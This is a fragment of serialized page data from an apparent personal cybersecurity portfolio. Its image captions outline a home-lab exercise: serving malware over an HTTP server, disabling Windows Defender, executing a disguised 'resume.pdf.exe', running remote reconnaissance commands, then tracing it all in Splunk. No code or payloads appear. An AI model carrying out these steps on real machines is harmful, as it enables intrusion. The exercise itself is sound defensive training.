Machine"},{"src":"/images/projects/homelab-part2/10 Http server setup for test machine to download malware.png","alt":"HTTP Server Setup for Malware Download"},{"src":"/images/projects/homelab-part2/11 Disabling windows defender.png","alt":"Disabling Windows Defender"},{"src":"/images/projects/homelab-part2/12 Accessing attacker server to download malware.png","alt":"Accessing Attacker Server"},{"src":"/images/projects/homelab-part2/13 downloaded malware without file extension.png","alt":"Downloaded Malware Without Extension"},{"src":"/images/projects/homelab-part2/14 Established connection between attacker and test machine after executing malware.png","alt":"Established Connection After Malware Execution"},{"src":"/images/projects/homelab-part2/15 Confirmation of process running on task manager.png","alt":"Process Confirmation in Task Manager"},{"src":"/images/projects/homelab-part2/16 Connection created at my handler.png","alt":"Connection Created at Handler"},{"src":"/images/projects/homelab-part2/17 Commands ran on the test machine from the attacker machine SHELL then NET USER.png","alt":"Commands Execution - SHELL and NET USER"},{"src":"/images/projects/homelab-part2/18 COMMAND NET LOCAL GROUP on shell .png","alt":"NET LOCAL GROUP Command Execution"},{"src":"/images/projects/homelab-part2/19 COMMAND ipconfig on SHELL.png","alt":"IPCONFIG Command Execution"},{"src":"/images/projects/homelab-part2/20 quering my attackig ip address on splunk.png","alt":"Querying Attacker IP in Splunk"},{"src":"/images/projects/homelab-part2/21 Quering RESUMEdotPDFdotEXE.png","alt":"Querying Malware Execution in Splunk"},{"src":"/images/projects/homelab-part2/22 Sticking with event code 1.png","alt":"Event Code 1 Analysis"},{"src":"/images/projects/homelab-part2/23 Parentprocess SPLUNK.png","alt":"Parent Process Analysis in Splunk"},{"src":"/images/projects/homelab-part2/24 what the parent process spawned cmd.exe.png","alt":"Parent Process Spawning CMD.exe"},{"src":"/images/projects/homelab-part2/25 with process id.png","alt":"Process ID Information"},{"src":"/images/projects/homelab-part2/26 Searching through processguid and structuring query.png","alt":"Process GUID Search and Query Structure"},{"src":"/images/projects/homelab-part2/27 Searching through processguid and structuring query to know what exactly happened.png","alt":"Detailed Query Structure Analysis"},{"src":"/images/projects/homelab-part2/28 Python http server to deply malware online for download.png","alt":"Python HTTP Server for Malware Deployment"}],"series":{"name":"Project 1: Building a Cybersecurity Home Lab","part":2,"totalParts":2}}],"oldestProjects":[{"slug":"30-day-mydfir-soc-analyst-challenge-part0","title":"Introduction to the MYDFIR SOC Analyst Challenge","description":"An introduction to the comprehensive 30-day challenge for aspiring SOC analysts.","date":"2024-10-31","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Blue Team","SOC","Security Monitoring","Training"],"content":"$17","image":"/images/projects/Mydfir 30 day challenge.png","technologies":["ELK Stack","SIEM","Security Tools","Monitoring"],"images":[{"src":"/images/projects/30-day-challenge/30Days-MYDFIR-Challenge.png","alt":"30 Days MYDFIR SOC Analyst Challenge Overview"}],"series":{"name":"Project 3: 30-Day MYDFIR SOC Analyst Challenge","part":0,"totalParts":30}},{"slug":"30-day-soc-analyst-challenge-part1","title":"Part 1: Foundation, A Logical Network Diagram","description":"Learn how to create a comprehensive logical network diagram for your SOC environment, establishing the foundation for my 30-day security monitoring journey.","date":"2024-11-01","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Network Diagram","SOC","Architecture","Documentation"],"content":"$18","image":"/images/projects/Mydfir 30 day challenge.png","technologies":[],"images":[{"src":"/images/projects/30-day-challenge/1-30Days-MYDFIR-Day-1.png","alt":"30 Days MYDFIR Challenge Day 1"},{"src":"/images/projects/30-day-challenge/2-Day-1-work-with-draw-io.png","alt":"Working with Draw.io on Day 1"}],"series":{"name":"Project 3: 30-Day MYDFIR SOC Analyst Challenge","part":1,"totalParts":30}},{"slug":"30-day-soc-analyst-challenge-part2","title":"Part 2: Diving into the ELK Stack","description":"Explore the powerful ELK stackâElasticsearch, Logstash, and Kibanaâand understand their crucial roles in security operations and log management.","date":"2024-11-02","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["ELK Stack","Elasticsearch","Logstash","Kibana","Log Management"],"content":"$19","image":"/images/projects/Mydfir 30 day challenge.png","technologies":[],"images":[{"src":"/images/projects/30-day-challenge/Day-2-mydfir-soc-analyst-challenge.png","alt":"Day 2 MYDFIR SOC Analyst Challenge"}],"series":{"name":"Project 3: 30-Day MYDFIR SOC Analyst Challenge","part":2,"totalParts":30}}],"newestProjects":[{"slug":"project-5-4-log-n-pacific-internship-threat-hunting-scenario4","title":"Project 5.4: LOG(N) Pacific Internship: Threat Hunting Scenario 4: PwnCrypt Ransomware Outbreak","description":"A comprehensive threat hunting exercise investigating a PwnCrypt ransomware outbreak, using Microsoft Defender for Endpoint to analyze file encryption activities, process execution chains, and ransomware indicators of compromise.","date":"2025-10-24","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Threat Hunting","Microsoft Defender for Endpoint","Ransomware Analysis","Incident Response","EDR","KQL","PowerShell"],"content":"$1a","image":"/images/projects/Zero-day-red.jpg","technologies":["Microsoft Defender for Endpoint","KQL","PowerShell","Windows"],"images":[],"series":{"name":"Project 5.4: LOG(N) Pacific Internship: Threat Hunting Scenario 4: PwnCrypt Ransomware Outbreak","order":4}},{"slug":"project-5-3-log-n-pacific-internship-threat-hunting-scenario3","title":"Project 5.3: LOG(N) Pacific Internship: Threat Hunting Scenario 3: Suspected Data Exfiltration","description":"A comprehensive threat hunting exercise investigating suspected data exfiltration by a disgruntled employee, using Microsoft Defender for Endpoint to identify unauthorized archiving and data transfer activities within the network.","date":"2025-10-20","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Threat Hunting","Microsoft Defender for Endpoint","Data Exfiltration","Insider Threat","EDR","KQL","PowerShell"],"content":"$1b","image":"/images/projects/Suspected Data Exfiltration.jpeg","technologies":["Microsoft Defender for Endpoint","KQL","PowerShell","Windows"],"images":[],"series":{"name":"Project 5.3: LOG(N) Pacific Internship: Threat Hunting Scenario 3: Suspected Data Exfiltration","order":3}},{"slug":"project-5-2-log-n-pacific-internship-threat-hunting-scenario2","title":"Project 5.2: LOG(N) Pacific Internship: Threat Hunting Scenario 2: Sudden Network Slowdown","description":"A comprehensive threat hunting exercise investigating sudden network performance degradation caused by internal port scanning activity, using Microsoft Defender for Endpoint to identify unauthorized reconnaissance within the network.","date":"2025-10-14","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Threat Hunting","Microsoft Defender for Endpoint","Network Security","Port Scanning","EDR","KQL","PowerShell"],"content":"$1c","image":"/images/projects/Windows Defender Fir..._imresizer.jpg","technologies":["Microsoft Defender for Endpoint","KQL","PowerShell","Windows"],"images":[],"series":{"name":"Project 5.2: LOG(N) Pacific Internship: Threat Hunting Scenario 2: Sudden Network Slowdown","order":2}}],"categoryCounts":{"All":50,"Blue Team":44,"Red Team":2,"Infrastructure":3,"Cloud":1}}]
e:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
b:null
c:null
10:[["$","title","0",{"children":"Samson's | Cybersecurity Portfolio"}],["$","meta","1",{"name":"description","content":"Professional cybersecurity portfolio showcasing expertise in digital security"}],["$","meta","2",{"name":"generator","content":"v0.dev"}],["$","link","3",{"rel":"icon","href":"https://hebbkx1anhila5yf.public.blob.vercel-storage.com/117%20Corporation%20no%20bg-5VVBXF0igK8jcCo43su7cpA2isco7t.png"}]]
